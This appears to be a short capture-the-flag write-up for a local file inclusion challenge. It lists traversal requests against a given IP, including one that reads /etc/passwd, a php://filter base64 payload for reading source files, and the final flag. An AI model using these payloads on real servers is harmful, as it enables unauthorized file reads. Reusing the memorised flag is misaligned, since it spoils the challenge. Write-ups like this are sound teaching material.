# LFI

**Points**: 500  
**Solves**: 0  
**Flag Format**: HPTU{__}

## Given

http://51.21.12.121:6004/

## Solution

1. Find a parameter like `?page=`, `?file=`, etc.
2. Test directory traversal: http://51.21.12.121:6004/?file=../../../../etc/passwd
3. If successful, read the flag: http://51.21.12.121:6004/?file=../../../../flag
4. Alternatively, use PHP filter to read source: http://51.21.12.121:6004/?page=php://filter/convert.base64-encode/resource=flagThen decode base64 to get flag.
5. **Flag:** `HPTU{LFI_3xpl0it3d}`
